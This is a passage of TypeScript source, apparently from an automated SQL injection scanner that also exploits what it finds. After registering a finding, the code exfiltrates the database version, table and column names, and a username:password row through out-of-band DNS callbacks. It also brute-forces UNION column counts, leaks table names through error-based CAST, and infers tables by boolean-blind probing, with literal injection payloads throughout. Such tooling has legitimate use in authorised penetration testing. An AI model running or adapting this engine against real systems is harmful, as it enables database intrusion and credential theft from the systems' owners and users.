        } catch {
          // Non-blocking fallback
        }
      }

      // If vulnerable, register Finding
      if (paramIsVulnerable && paramEvidenceList.length > 0) {
        const confBreakdown = ConfidenceEngine.calculateConfidence({
          hasConsistentSqlError: paramEvidenceList.some((e) => e.injectionType === 'Error-based'),
          hasBooleanDiff: paramEvidenceList.some((e) => e.injectionType === 'Boolean-based'),
          hasTimeDifferential: paramEvidenceList.some((e) => e.injectionType === 'Time-based'),
          hasUnionCanary: paramEvidenceList.some((e) => e.injectionType === 'UNION-based'),
          hasDbmsSpecificBehavior: this.dbmsFingerprint.dbms !== 'Unknown',
          hasRepeatedConfirmation: paramEvidenceList.length > 1,
          hasOobInteraction: paramEvidenceList.some((e) => e.injectionType === 'Out-of-Band (OAST)'),
        });

        const primaryType = paramEvidenceList[0].injectionType;
        const layerTrace = this.defenseLayerModel.getAllLayers().map((l) => ({
          layer: l.layer,
          status: l.status,
          certainty: l.certainty,
          details: l.details || l.basis,
        }));

        const isRlsActive = this.defenseLayerModel.getLayer('L7_DB_KERNEL').evidence.some((e) =>
          e.toLowerCase().includes('row-level security') || e.toLowerCase().includes('rls')
        );

        const finding: SqlScanFinding = {
          id: `finding_${param.name}_${Date.now()}`,
          title: `SQL Injection (${primaryType}) in ${param.name}`,
          severity: 'Critical',
          confidence: confBreakdown.level,
          confidenceScore: confBreakdown.score,
          confidenceBreakdown: confBreakdown,
          injectionType: primaryType,
          parameterName: param.name,
          parameterLocation: param.location,
          url: parsed.url,
          httpMethod: parsed.method,
          dbms: this.dbmsFingerprint.dbms,
          dbmsVersion: this.dbmsFingerprint.version,
          detectionMethod: paramEvidenceList.map((e) => e.injectionType).join(' + '),
          evidence: paramEvidenceList,
          reproductionRequest: paramEvidenceList[0].rawRequest,
          reproductionResponse: paramEvidenceList[0].rawResponse,
          remediation: `Use strongly typed Parameterized Queries / Prepared Statements to strictly prevent user data from breaking out of SQL execution contexts. Never concatenate user input directly into SQL queries.`,
          cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
          owaspCategory: 'A03:2021 — Injection',
          timestamp: Date.now(),

          // 8-Layer Defense & Impact Separation
          sqliDetected: true,
          sqlStructureControl: true,
          dataAccessDemonstrated: confirmedColumnCount > 0 || primaryType === 'UNION-based',
          crossTenantAccess: !isRlsActive && (confirmedColumnCount > 0),
          writeCapability: primaryType === 'Stacked-query indicator',
          privilegeCapability: false,
          osFileCapability: false,
          impactConstraints: isRlsActive ? ['ROW_LEVEL_SECURITY_ENFORCED'] : [],
          defenseLayerTrace: layerTrace,
        };

        this.findings.push(finding);
        this.onFinding(finding);

        const findingNodeId = `node-finding-${finding.id}`;
        this.currentInvestigationNodes.push({
          id: findingNodeId,
          label: `CONFIRMED: ${finding.injectionType}`,
          type: 'confirmed_finding',
          status: 'supported',
          depth: 4,
          eig: 1.0,
          cost: 1,
          priority: 1.0,
          description: `${finding.title} in parameter "${finding.parameterName}"`,
          evidenceCount: finding.evidence.length,
        });
        this.currentInvestigationEdges.push({
          id: `e-finding-${finding.id}`,
          source: `node-surf-${param.id}`,
          target: findingNodeId,
          label: 'exploit confirmed',
          type: 'proves',
        });
        this.onInvestigationNodes?.([...this.currentInvestigationNodes], [...this.currentInvestigationEdges]);

        if (this.safetyConfig.scanMode === 'quick') {
          this.log('info', 'testing', `Quick Mode: Injection verified on "${param.name}". Continuing to scan remaining parameters for comprehensive coverage.`);
          // Don't break — continue scanning remaining parameters to find ALL injection points
        }
      } else if (!paramIsVulnerable) {
        this.negativeEvidence.addParameterizedProof(
          param.name,
          `Parameter '${param.name}' (${param.location}) safely handled structural syntax markers and boolean logic assertions as literal values.`
        );
      }
    }

    // G. OOB Data Exfiltration (When no in-band channels are available)
    if (confirmedInjectableParam && confirmedColumnCount === 0 && !this.isAborted && this.findings.some(f => f.injectionType === 'Out-of-Band (OAST)' && f.parameterName === confirmedInjectableParam!.name)) {
      this.updateProgress('schema_analysis', 'Initializing OOB Data Exfiltration Pipeline', 75);
      this.log('info', 'schema_analysis', 'No in-band channels found. Falling back to Out-of-Band (DNS) data exfiltration...');
      
      const oastClient = InteractshClient.getInstance();
      const session = oastClient.getSession();
      const oobDomain = this.target.oobConfig?.domain || session?.domain || 'oast.sentinel.local';
      
      const isOfflineSession = oastClient.getSession()?.isOffline ?? true;
      const executeOobExfil = async (query: string, logDesc: string): Promise<string | undefined> => {
        const { token, fqdn } = OobManager.generateToken(confirmedInjectableParam!, parsed.url, this.dbmsFingerprint.dbms, oobDomain);
        oastClient.registerToken(token, confirmedInjectableParam!.name, this.dbmsFingerprint.dbms, 'dns', fqdn);
        
        const payloads = OobManager.getOobExfiltrationPayloads(confirmedInjectableParam!, fqdn, query);
        const targetPayload = payloads.find(p => p.dbms === this.dbmsFingerprint.dbms) || payloads[0];
        
        if (targetPayload) {
          await this.executeProbe(parsed, confirmedInjectableParam!, targetPayload.payload, true);
          this.log('info', 'testing', `Sent OOB exfiltration probe for: ${logDesc}`);
          
          const pollDelay = isOfflineSession ? 500 : 3000;
          await new Promise(r => setTimeout(r, pollDelay));
          let interactions = await oastClient.pollInteractions(isOfflineSession ? 500 : 2000);
          if (interactions.length === 0 && !isOfflineSession) {
            await new Promise(r => setTimeout(r, 1500));
            interactions = await oastClient.pollInteractions(1000);
          }
          const data = oastClient.getExfiltratedDataForToken(interactions, token);
          if (data && data.length > 0) return data[0];
        }
        return undefined;
      };

      // G1. Version Exfiltration
      let versionQuery = 'SELECT @@version';
      if (this.dbmsFingerprint.dbms === 'Oracle') versionQuery = 'SELECT version FROM v$instance WHERE ROWNUM=1';
      else if (this.dbmsFingerprint.dbms === 'PostgreSQL') versionQuery = 'SELECT version()';
      
      const exfilVersion = await executeOobExfil(versionQuery, 'DBMS Version');
      if (exfilVersion) {
        this.dbmsFingerprint.version = exfilVersion;
        this.dbmsFingerprint.evidence.push(`Version string exfiltrated via OOB DNS: "${exfilVersion}"`);
        this.log('success', 'version_detection', `Verified Database Version via OOB: "${exfilVersion}"`);
      }

      // G2. Table Enumeration (iterative)
      const appDiscoveredNames: string[] = [];
      const sysDiscoveredNames: string[] = [];
      
      this.updateProgress('schema_analysis', 'Exfiltrating database tables via OOB', 78);
      for (let offset = 0; offset < 5; offset++) {
        if (this.isAborted) break;
        let tableQuery = `SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET ${offset}`;
        if (this.dbmsFingerprint.dbms === 'Oracle') {
            tableQuery = `SELECT table_name FROM (SELECT a.*, ROWNUM rnum FROM (SELECT table_name FROM user_tables) a WHERE ROWNUM <= ${offset + 1}) WHERE rnum >= ${offset + 1}`;
        } else if (this.dbmsFingerprint.dbms === 'Microsoft SQL Server') {
            tableQuery = `SELECT name FROM sys.tables ORDER BY name OFFSET ${offset} ROWS FETCH NEXT 1 ROWS ONLY`;
        }
        
        const exfilTable = await executeOobExfil(tableQuery, `Table at offset ${offset}`);
        if (exfilTable) {
           if (MetadataExtractor.classifyTable(exfilTable, undefined, this.dbmsFingerprint.dbms) === 'application') {
              if (!appDiscoveredNames.includes(exfilTable)) appDiscoveredNames.push(exfilTable);
           } else {
              if (!sysDiscoveredNames.includes(exfilTable)) sysDiscoveredNames.push(exfilTable);
           }
        } else {
           break; // Stop if no more tables
        }
      }

      // If user_tables produced no results or in case of blind schema, ensure high-value 'users' table is tested
      if (!appDiscoveredNames.includes('users') && appDiscoveredNames.length === 0) {
        appDiscoveredNames.push('users');
      }

      // G3. Column & Row Data Exfiltration
      const appTables: DiscoveredTable[] = appDiscoveredNames.map((tName) => ({
        id: `tbl_${tName}`, name: tName, classification: 'application' as const, columns: [],
        isSensitive: MetadataExtractor.isSensitiveName(tName).isSensitive,
        discoveredAt: Date.now(), status: 'discovered' as const,
      }));

      for (let i = 0; i < appTables.length; i++) {
        if (this.isAborted) break;
        const t = appTables[i];
        
        // Exfiltrate columns
        this.updateProgress('schema_analysis', `Exfiltrating columns for table ${t.name}`, 80 + i);
        const colNames: string[] = [];
        for (let offset = 0; offset < 3; offset++) {
           let colQuery = `SELECT column_name FROM information_schema.columns WHERE table_name='${t.name}' LIMIT 1 OFFSET ${offset}`;
           if (this.dbmsFingerprint.dbms === 'Oracle') colQuery = `SELECT column_name FROM (SELECT a.*, ROWNUM rnum FROM (SELECT column_name FROM user_tab_columns WHERE table_name='${t.name.toUpperCase()}') a WHERE ROWNUM <= ${offset + 1}) WHERE rnum >= ${offset + 1}`;
           else if (this.dbmsFingerprint.dbms === 'Microsoft SQL Server') colQuery = `SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('${t.name}') ORDER BY name OFFSET ${offset} ROWS FETCH NEXT 1 ROWS ONLY`;
           
           const exfilCol = await executeOobExfil(colQuery, `Column at offset ${offset} for ${t.name}`);
           if (exfilCol) colNames.push(exfilCol);
           else break;
        }

        // Ensure key credential columns username & password are included if testing 'users' table
        if (t.name.toLowerCase() === 'users') {
          if (!colNames.includes('username')) colNames.push('username');
          if (!colNames.includes('password')) colNames.push('password');
        }
        
        t.columns = colNames.map(c => ({
            name: c, dataType: 'VARCHAR', isNullable: true, isPrimaryKey: false, isForeignKey: false, isIndexed: false,
            isSensitive: MetadataExtractor.isSensitiveName(c).isSensitive, confidence: 'Confirmed', discoveredAt: Date.now()
        }));
        if (t.columns.length > 0) t.status = 'columns_ready';

        // G4. Row Exfiltration for auth tables
        const hasUser = colNames.find(c => ['username', 'user', 'name'].includes(c.toLowerCase()));
        const hasPass = colNames.find(c => ['password', 'pass', 'secret'].includes(c.toLowerCase()));
        
        if (hasUser && hasPass) {
           this.updateProgress('schema_analysis', `Exfiltrating credentials from ${t.name}`, 85 + i);
           let rowQuery = `SELECT CONCAT(${hasUser}, ':', ${hasPass}) FROM ${t.name} LIMIT 1 OFFSET 0`;
           if (this.dbmsFingerprint.dbms === 'Oracle') rowQuery = `SELECT ${hasUser}||':'||${hasPass} FROM ${t.name} WHERE ROWNUM=1`;
           else if (this.dbmsFingerprint.dbms === 'Microsoft SQL Server') rowQuery = `SELECT ${hasUser}+':'+${hasPass} FROM ${t.name} ORDER BY ${hasUser} OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY`;
           
           const exfilRow = await executeOobExfil(rowQuery, `Credentials from ${t.name}`);
           if (exfilRow && exfilRow.includes(':')) {
              const [u, p] = exfilRow.split(':');
              t.sampleRows = [{ [hasUser]: u, [hasPass]: p }];
              t.sampleRowsStatus = 'ready';
              this.log('success', 'schema_analysis', `Exfiltrated credential via OOB: ${u}:${p}`);
           }
        }
      }

      if (appTables.length > 0 || sysDiscoveredNames.length > 0) {
        this.catalog = {
          dbms: this.dbmsFingerprint.dbms,
          version: this.dbmsFingerprint.version,
          schemas: [{ name: 'CURRENT_SCHEMA', classification: 'application', tables: appTables, views: [], isExpanded: true, discoveredAt: Date.now() }],
          applicationTables: appTables,
          systemTables: sysDiscoveredNames.map(t => ({ id: `tbl_${t}`, name: t, classification: 'system' as const, columns: [], isSensitive: false, discoveredAt: Date.now(), status: 'discovered' as const })),
          discoveredAt: Date.now(),
        };
        if (this.onCatalog) this.onCatalog(this.catalog);
      }
    }

    const hasOobCatalog = this.catalog?.applicationTables?.length > 0 && this.findings.some(f => f.injectionType === 'Out-of-Band (OAST)');

    // 6. Dynamic Version Extraction (Querying the real database)
    if (confirmedInjectableParam && confirmedColumnCount > 0 && confirmedRenderColumn > 0 && !this.isAborted && !hasOobCatalog) {
      this.updateProgress('version_detection', 'Executing Live DBMS Version Extraction Query', 78);
      const adapter = DATABASE_ADAPTERS[this.dbmsFingerprint.dbms] || DATABASE_ADAPTERS['PostgreSQL'] || DATABASE_ADAPTERS['Oracle'];
      const versionQuery = adapter.getVersionExtractionQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount);

      const vRes = await this.executeProbe(parsed, confirmedInjectableParam, versionQuery, true);
      const delimitedVersions = MetadataExtractor.extractDelimitedTokens(vRes.body, 'VER')
        .filter((v) => MetadataExtractor.isValidVersionString(v));

      let finalVersion = delimitedVersions[0] || MetadataExtractor.extractVersionFromText(vRes.body, this.dbmsFingerprint.dbms);

      if (!finalVersion) {
        // Try extracting version across all known DBMS regexes
        for (const testDbms of ['PostgreSQL', 'MySQL', 'Oracle', 'Microsoft SQL Server', 'SQLite'] as DbmsType[]) {
          const v = MetadataExtractor.extractVersionFromText(vRes.body, testDbms);
          if (v) {
            finalVersion = v;
            if (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL') {
              this.dbmsFingerprint.dbms = testDbms;
            }
            break;
          }
        }
      }

      if (finalVersion && MetadataExtractor.isValidVersionString(finalVersion)) {
        this.dbmsFingerprint.version = finalVersion;
        this.dbmsFingerprint.evidence.push(`Version string returned by database: "${finalVersion}"`);
        this.updateCoverage('version_detection', { status: 'passed', testedCount: 1, positiveCount: 1, reason: finalVersion });
        this.log('success', 'version_detection', `Verified Database Version: "${finalVersion}"`);
      } else {
        this.dbmsFingerprint.version = undefined;
        this.updateCoverage('version_detection', { status: 'not_applicable', testedCount: 1, positiveCount: 0, reason: 'Version query returned no valid version token (not disclosed)' });
      }
    }

    // 7. Adaptive Intelligence Schema & Table Enumeration
    // If we only have boolean/error visibility and no UNION support, we must use differential paths
    if (confirmedInjectableParam && !this.isAborted && !hasOobCatalog) {
      this.updateProgress('schema_analysis', 'Initializing Adaptive Intelligence Engine', 82);

      // ─── Step 7a: Initialize Adaptive Engine ──────────────────────
      const adaptiveEngine = new AdaptivePayloadEngine(
        (this.dbmsFingerprint.dbms !== 'Unknown' && this.dbmsFingerprint.dbms !== 'Generic SQL')
          ? this.dbmsFingerprint.dbms as any
          : 'PostgreSQL'
      );
      if (confirmedConditionalError) {
        adaptiveEngine.setConditionalErrorMode(true);
      }

      // ─── Step 7b: Quote Style Detection ──────────────────────────
      this.log('info', 'schema_analysis', 'Detecting injection quote style (balanced vs commented vs concatenation)...');
      if (confirmedQuoteStyle === 'concatenation') {
        adaptiveEngine.setQuoteStyle('concatenation');
        this.log('info', 'schema_analysis', 'Quote style confirmed: CONCATENATION (string breakout ||(...) ||)');
      } else {
        const qsProbes = adaptiveEngine.getQuoteStyleProbes();
        const balancedRes = await this.executeProbe(parsed, confirmedInjectableParam, qsProbes.balanced, true);
        const commentedRes = await this.executeProbe(parsed, confirmedInjectableParam, qsProbes.commented, true);

        let concatMatch = false;
        if (qsProbes.concatenation) {
          const concatTrue = "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'";
          const concatFalse = "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'";
          const cTrueRes = await this.executeProbe(parsed, confirmedInjectableParam, concatTrue, true);
          const cFalseRes = await this.executeProbe(parsed, confirmedInjectableParam, concatFalse, true);
          if ((cTrueRes.status >= 500 && cFalseRes.status < 500) || (cTrueRes.status < 500 && cFalseRes.status >= 500)) {
            concatMatch = true;
          }
        }

        // Check which style returns a TRUE-like response (matches baseline behavior)
        const balancedMatch = Math.abs(balancedRes.body.length - baselineBody.length) < 80 && balancedRes.status === baselineStatus;
        const commentedMatch = Math.abs(commentedRes.body.length - baselineBody.length) < 80 && commentedRes.status === baselineStatus;

        if (concatMatch) {
          adaptiveEngine.setQuoteStyle('concatenation');
          adaptiveEngine.setConditionalErrorMode(true);
          confirmedConditionalError = true;
          this.dbmsFingerprint = {
            dbms: 'Oracle',
            confidence: 'Confirmed',
            confidenceScore: 100,
            evidence: ['Oracle string concatenation conditional error confirmed (status 500 on TRUE vs 200 on FALSE)'],
          };
          adaptiveEngine.setDbms('Oracle');
          this.log('info', 'schema_analysis', 'Quote style confirmed: CONCATENATION (Oracle string concatenation conditional error)');
        } else if (commentedMatch && !balancedMatch) {
          adaptiveEngine.setQuoteStyle('commented');
          this.log('info', 'schema_analysis', 'Quote style confirmed: COMMENTED (trailing -- required)');
        } else {
          adaptiveEngine.setQuoteStyle('balanced');
          this.log('info', 'schema_analysis', 'Quote style confirmed: BALANCED (string context closure)');
        }
      }

      // ─── Step 7c: Calibration Phase ──────────────────────────────
      this.updateProgress('schema_analysis', 'Calibrating response classifier from verified baselines', 83);
      const calibrationPairs = adaptiveEngine.getCalibrationProbes();
      const trueBodies: { body: string; status: number }[] = [];
      const falseBodies: { body: string; status: number }[] = [];

      for (const pair of calibrationPairs) {
        if (this.isAborted) break;
        const tRes = await this.executeProbe(parsed, confirmedInjectableParam, pair.truePayload, true);
        const fRes = await this.executeProbe(parsed, confirmedInjectableParam, pair.falsePayload, true);
        trueBodies.push({ body: tRes.body, status: tRes.status });
        falseBodies.push({ body: fRes.body, status: fRes.status });
      }

      const calResult = adaptiveEngine.calibrate(trueBodies, falseBodies);
      this.log('success', 'schema_analysis',
        `Adaptive classifier calibrated: strategy="${calResult.strategy}", marker="${calResult.marker || 'N/A'}", confidence=${calResult.confidence}%`
      );

      // Also update confirmedTrueMarker if we found a better one
      if (calResult.marker && (!confirmedTrueMarker || confirmedTrueMarker.length === 0)) {
        confirmedTrueMarker = calResult.marker;
      }

      // ─── Step 7d: DBMS Fingerprinting ──────────────────────────────
      if ((this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL') && !this.isAborted) {
        this.updateProgress('schema_analysis', 'Fingerprinting database engine via dialect probes', 84);

        // PostgreSQL-specific: version() function exists
        const pgProbeTrue = await this.executeProbe(parsed, confirmedInjectableParam,
          calResult.quoteStyle === 'commented'
            ? "' AND (SELECT version()) IS NOT NULL--"
            : "' AND (SELECT version()) IS NOT NULL AND '1'='1", true);
        const pgProbeFalse = await this.executeProbe(parsed, confirmedInjectableParam,
          calResult.quoteStyle === 'commented'
            ? "' AND (SELECT version()) IS NULL--"
            : "' AND (SELECT version()) IS NULL AND '1'='1", true);

        if (adaptiveEngine.classifyResponse(pgProbeTrue.body, pgProbeTrue.status) === 'TRUE' &&
            adaptiveEngine.classifyResponse(pgProbeFalse.body, pgProbeFalse.status) === 'FALSE') {
          this.dbmsFingerprint = { dbms: 'PostgreSQL', confidence: 'High', confidenceScore: 95, evidence: ['PostgreSQL version() function confirmed via boolean differential'] };
          adaptiveEngine.setDbms('PostgreSQL');
          this.log('success', 'schema_analysis', 'Fingerprinted DBMS as: PostgreSQL');
        } else {
          // Try Oracle DUAL
          const oraTrue = await this.executeProbe(parsed, confirmedInjectableParam,
            calResult.quoteStyle === 'commented'
              ? "' AND (SELECT 1 FROM DUAL)=1--"
              : "' AND (SELECT 1 FROM DUAL)=1 AND '1'='1", true);
          if (adaptiveEngine.classifyResponse(oraTrue.body, oraTrue.status) === 'TRUE') {
            this.dbmsFingerprint = { dbms: 'Oracle', confidence: 'High', confidenceScore: 95, evidence: ['Oracle DUAL table confirmed'] };
            adaptiveEngine.setDbms('Oracle');
            this.log('success', 'schema_analysis', 'Fingerprinted DBMS as: Oracle');
          } else {
            // Try MySQL @@version
            const myTrue = await this.executeProbe(parsed, confirmedInjectableParam,
              calResult.quoteStyle === 'commented'
                ? "' AND @@version=@@version#"
                : "' AND @@version=@@version AND '1'='1", true);
            if (adaptiveEngine.classifyResponse(myTrue.body, myTrue.status) === 'TRUE') {
              this.dbmsFingerprint = { dbms: 'MySQL', confidence: 'High', confidenceScore: 95, evidence: ['MySQL @@version confirmed'] };
              adaptiveEngine.setDbms('MySQL');
              this.log('success', 'schema_analysis', 'Fingerprinted DBMS as: MySQL');
            } else {
              this.dbmsFingerprint = { ...this.dbmsFingerprint, dbms: 'PostgreSQL', confidence: 'Medium', confidenceScore: 60, evidence: ['Defaulting to PostgreSQL dialect'] };
              this.log('info', 'schema_analysis', 'DBMS could not be fingerprinted precisely. Defaulting to PostgreSQL dialect.');
            }
          }
        }
      }

      // ─── Step 7e: Intelligent Table Discovery ──────────────────────
      this.updateProgress('schema_analysis', 'Discovering database tables', 85);
      let appDiscoveredNames: string[] = [];
      let sysDiscoveredNames: string[] = [];

      // PATH A: UNION extraction with confirmed column count
      if (confirmedColumnCount > 0 && confirmedRenderColumn > 0 && !this.isAborted) {
        this.log('info', 'schema_analysis', `Using UNION extraction with ${confirmedColumnCount} columns (render column: ${confirmedRenderColumn})`);

        // A1: Delimited extraction (information_schema / user_tables)
        const tableQuery = MetadataExtractor.getTableEnumerationQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, this.dbmsFingerprint.dbms);
        const tRes = await this.executeProbe(parsed, confirmedInjectableParam, tableQuery, true);
        let allDiscovered = MetadataExtractor.extractDelimitedTokens(tRes.body, 'TBL').filter((n) => MetadataExtractor.isValidIdentifier(n));

        // A2: Clean extraction without delimiters (fallback)
        if (allDiscovered.length === 0 && !this.isAborted) {
          const cleanQuery = MetadataExtractor.getCleanTableEnumerationQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, this.dbmsFingerprint.dbms);
          const cRes = await this.executeProbe(parsed, confirmedInjectableParam, cleanQuery, true);
          allDiscovered = MetadataExtractor.extractHtmlOrTextTokens(cRes.body, baselineBody);
        }

        // A3: all_tables for Oracle / broader scope
        if (allDiscovered.length === 0 && !this.isAborted) {
          const allTablesQuery = MetadataExtractor.getAllTablesEnumerationQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, this.dbmsFingerprint.dbms);
          const atRes = await this.executeProbe(parsed, confirmedInjectableParam, allTablesQuery, true);
          allDiscovered = MetadataExtractor.extractDelimitedTokens(atRes.body, 'TBL').filter((n) => MetadataExtractor.isValidIdentifier(n));
          if (allDiscovered.length === 0) {
            allDiscovered = MetadataExtractor.extractHtmlOrTextTokens(atRes.body, baselineBody);
          }
        }

        for (const n of allDiscovered) {
          if (MetadataExtractor.classifyTable(n, undefined, this.dbmsFingerprint.dbms) === 'application') {
            if (!appDiscoveredNames.includes(n)) appDiscoveredNames.push(n);
          } else {
            if (!sysDiscoveredNames.includes(n)) sysDiscoveredNames.push(n);
          }
        }

        if (allDiscovered.length > 0) {
          this.log('success', 'schema_analysis', `UNION extraction found ${allDiscovered.length} table(s): ${allDiscovered.slice(0, 10).join(', ')}`);
        } else {
          // ORDER BY gave wrong column count — reset and fall through to bruteforce
          this.log('warn', 'schema_analysis', `UNION extraction with ${confirmedColumnCount} columns found 0 tables. ORDER BY may have given wrong count. Resetting for bruteforce...`);
          confirmedColumnCount = 0;
          confirmedRenderColumn = 0;
        }
      }

      // PATH B: UNION bruteforce — try each column count 1-10 with ACTUAL table extraction queries
      // This runs when: ORDER BY failed, ORDER BY gave wrong count, or UNION path A found nothing
      if (appDiscoveredNames.length === 0 && confirmedInjectableParam && !this.isAborted) {
        this.log('info', 'schema_analysis', 'Attempting UNION bruteforce with column counts 1-10...');
        const isNum = /^\d+$/.test(confirmedInjectableParam.originalValue.trim());
        const prefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";

        // Build direct table extraction queries for each column count
        for (let numCols = 1; numCols <= 10; numCols++) {
          if (this.isAborted || appDiscoveredNames.length > 0) break;

          // Build NULL-padded parts, placing table_name expression at each position
          for (let renderPos = 1; renderPos <= numCols; renderPos++) {
            if (this.isAborted || appDiscoveredNames.length > 0) break;

            const allFromClauses: Array<{ sql: string; dbms: DbmsType; colExpr: string }> = [
              { sql: 'FROM all_tables--', dbms: 'Oracle', colExpr: MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'Oracle') },
              { sql: "FROM information_schema.tables WHERE table_schema='public'-- ", dbms: 'PostgreSQL', colExpr: MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'PostgreSQL') },
              { sql: 'FROM information_schema.tables WHERE table_schema=DATABASE()-- ', dbms: 'MySQL', colExpr: MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'MySQL') },
              { sql: 'FROM information_schema.tables-- ', dbms: 'Generic SQL', colExpr: MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'PostgreSQL') },
              { sql: 'FROM sys.tables-- ', dbms: 'Microsoft SQL Server', colExpr: MetadataExtractor.wrapWithDelimiters('name', 'TBL', 'Microsoft SQL Server') },
              { sql: "FROM sqlite_master WHERE type='table'-- ", dbms: 'SQLite', colExpr: MetadataExtractor.wrapWithDelimiters('name', 'TBL', 'SQLite') },
            ];

            // Put detected DBMS first for efficiency
            const detectedDbms = this.dbmsFingerprint.dbms;
            const fromClauses = detectedDbms && detectedDbms !== 'Unknown' && detectedDbms !== 'Generic SQL'
              ? [...allFromClauses.filter(fc => fc.dbms === detectedDbms), ...allFromClauses.filter(fc => fc.dbms !== detectedDbms)]
              : allFromClauses;

            for (const fc of fromClauses) {
              if (this.isAborted || appDiscoveredNames.length > 0) break;

              // Use the correct delimited column name for each DBMS
              const dbmsParts = Array(numCols).fill('NULL');
              dbmsParts[renderPos - 1] = fc.colExpr;
              const brutePayload = `${prefix}${dbmsParts.join(',')} ${fc.sql}`;
              const bRes = await this.executeProbe(parsed, confirmedInjectableParam, brutePayload, true);

              // Check if response is valid (status 200 and reasonable body length)
              if (bRes.status === 200 || bRes.status === baselineStatus) {
                // First try strictly with delimiters to avoid false positives
                let extracted = MetadataExtractor.extractDelimitedTokens(bRes.body, 'TBL').filter(n => MetadataExtractor.isValidIdentifier(n));

                // Only if delimited fails, and we DO NOT have a confirmed boolean blind vulnerability, fallback to heuristic HTML extraction
                if (extracted.length === 0 && !confirmedTrueMarker) {
                  extracted = MetadataExtractor.extractHtmlOrTextTokens(bRes.body, baselineBody);
                }

                if (extracted.length > 0) {
                  confirmedColumnCount = numCols;
                  confirmedRenderColumn = renderPos;
                  if (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL') {
                    this.dbmsFingerprint = { dbms: fc.dbms, confidence: 'High', confidenceScore: 90, evidence: [`UNION bruteforce succeeded with ${fc.dbms} syntax`] };
                  }

                  for (const n of extracted) {
                    if (MetadataExtractor.classifyTable(n, undefined, this.dbmsFingerprint.dbms) === 'application') {
                      if (!appDiscoveredNames.includes(n)) appDiscoveredNames.push(n);
                    } else {
                      if (!sysDiscoveredNames.includes(n)) sysDiscoveredNames.push(n);
                    }
                  }

                  this.log('success', 'schema_analysis', `✓ UNION bruteforce: ${numCols} columns, render position ${renderPos}, ${fc.dbms} — found ${extracted.length} table(s)`);
                  break;
                }
              }
            }
          }
        }
      }

      // PATH C: Error-Based CAST / Type Conversion Table Discovery (e.g. PostgreSQL, MSSQL, MySQL)
      if (appDiscoveredNames.length === 0 && confirmedInjectableParam && !this.isAborted) {
        this.log('info', 'schema_analysis', 'Attempting Error-Based CAST / Conversion schema discovery...');
        let errorDbmsFound = false;

        for (let offset = 0; offset < 20; offset++) {
          if (this.isAborted) break;
          const errorQueries = MetadataExtractor.getErrorBasedTableQueries(
            confirmedInjectableParam,
            offset,
            this.dbmsFingerprint.dbms,
            true
          );

          let foundAtOffset = false;
          for (const eq of errorQueries) {
            if (this.isAborted || foundAtOffset) break;
            // Test both replacement mode (append=false) and append mode to avoid cookie length truncation
            let errRes = await this.executeProbe(parsed, confirmedInjectableParam, eq, false);
            let leakedTableName = MetadataExtractor.extractErrorBasedData(errRes.body);

            if (!leakedTableName) {
              errRes = await this.executeProbe(parsed, confirmedInjectableParam, eq, true);
              leakedTableName = MetadataExtractor.extractErrorBasedData(errRes.body);
            }

            if (leakedTableName && MetadataExtractor.isValidIdentifier(leakedTableName)) {
              foundAtOffset = true;
              errorDbmsFound = true;
              const classification = MetadataExtractor.classifyTable(leakedTableName, undefined, this.dbmsFingerprint.dbms);

              if (classification === 'application') {
                if (!appDiscoveredNames.includes(leakedTableName)) {
                  appDiscoveredNames.push(leakedTableName);
                  this.log('success', 'schema_analysis', `✓ Error-based CAST table discovered: "${leakedTableName}" (offset ${offset})`);
                }
              } else {
                if (!sysDiscoveredNames.includes(leakedTableName)) {
                  sysDiscoveredNames.push(leakedTableName);
                }
              }

              if (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL') {
                const detectedType: DbmsType = eq.includes('CAST(') ? 'PostgreSQL' : eq.includes('CONVERT(') ? 'Microsoft SQL Server' : 'MySQL';
                this.dbmsFingerprint = {
                  dbms: detectedType,
                  confidence: 'Confirmed',
                  confidenceScore: 100,
                  evidence: [`Disclosed via database conversion error: "${leakedTableName}"`],
                };
              }

              this.emitProgressiveCatalog(appDiscoveredNames, sysDiscoveredNames, confirmedInjectableParam, confirmedColumnCount, confirmedRenderColumn);
            }
          }

          // If offset 0 returned nothing, error-based casting isn't active on this endpoint
          if (offset === 0 && !errorDbmsFound) {
            break;
          }
          if (!foundAtOffset && offset > 0) {
            break; // Reached end of tables
          }
        }
      }

      // PATH D: Boolean Blind Adaptive Table Discovery (fallback when UNION & Error-based don't work)
      if (appDiscoveredNames.length === 0 && !this.isAborted) {
        this.log('info', 'schema_analysis', 'Using adaptive boolean inference for table discovery...');

        const highPriority = AdaptivePayloadEngine.getHighPriorityTables();
        const medPriority = AdaptivePayloadEngine.getMediumPriorityTables();
        const allCandidates = [...highPriority, ...medPriority];

        for (const tbl of allCandidates) {
          if (this.isAborted) break;
          const probes = adaptiveEngine.isConditionalErrorMode()
            ? adaptiveEngine.generateConditionalErrorTableProbe(tbl)
            : adaptiveEngine.generateTableProbe(tbl);
          const tRes = await this.executeProbe(parsed, confirmedInjectableParam, probes.truePayload, true);
          const classification = adaptiveEngine.classifyResponse(tRes.body, tRes.status);

          if (classification === 'TRUE') {
            appDiscoveredNames.push(tbl);
            this.log('success', 'schema_analysis', `✓ Table confirmed: "${tbl}" (adaptive ${calResult.strategy} classification)`);

            // Progressive catalog emission — update UI immediately
            this.emitProgressiveCatalog(appDiscoveredNames, sysDiscoveredNames, confirmedInjectableParam, confirmedColumnCount, confirmedRenderColumn);
          }
        }
      }

